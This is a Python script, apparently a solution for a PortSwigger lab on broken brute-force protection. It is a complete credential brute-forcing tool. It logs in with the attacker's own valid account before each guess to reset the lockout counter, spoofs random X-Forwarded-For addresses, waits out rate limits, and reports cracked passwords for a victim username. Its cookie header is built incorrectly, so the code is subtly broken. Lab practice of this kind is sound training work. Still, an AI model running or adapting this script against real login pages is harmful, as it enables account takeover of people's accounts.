from requests import request
from random import randint
from time import sleep
from sys import argv
from io import FileIO


def get_session(url):
    print('GET /login')
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def readWorldList(wordlist_name):
    try:
        worldlist=FileIO(wordlist_name).read().decode().split('\n')
        while worldlist.count(''):
            worldlist.remove('')
        return worldlist
    except :
        print('[-] Error While reading file')

def generate_random_ip():
    return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))

def login(url,cookies,username,password):
    headers={'X-Forwarded-For':generate_random_ip(),cookies:cookies}
    data='username='+username+'&password='+password
    res=request(url=url,method='POST',headers=headers,data=data)
    return res

def bruteforce(url,cookies,attacker_username,attacker_password,username,password_list):
    index=0
    while index<len(password_list):
        login(url,cookies,attacker_username,attacker_password)
        print('[!] Trying => '+username+":"+password_list[index])
        res=login(url,cookies,username,password_list[index])
        content = res.content.decode()
        if content.count('You have made too many incorrect login attempts. Please try again in 1 minute(s).')==0 and content.count('Incorrect password')==0:
            print('Cracked With : {username:'+username+',password:'+password_list[index]+'}')
            return
        elif content.count('You have made too many incorrect login attempts. Please try again in 1 minute(s).')!=0:
            print('[+] Sleeping for 1 minute')
            sleep(60)
            continue
        else:
            index=index+1


def pwn(url,attacker_username,attacker_password,victime_username,password_list):
    if url[-1]!='/':
        url=url+'/'
    password_list=readWorldList(password_list)
    cookies=get_session(url+'login')
    bruteforce(url+'login',cookies,attacker_username,attacker_password,victime_username,password_list)

if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : Broken-Brute-Force-Protection-IP-Block
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==6:
     pwn(argv[1],argv[2],argv[3],argv[4],argv[5])
 else:
     print("call it with : python3 ./pwn-auth-broken-brute-force-protection-ip-block <url> attacker_username attacker_password victime_username <path to password wordlist> ")
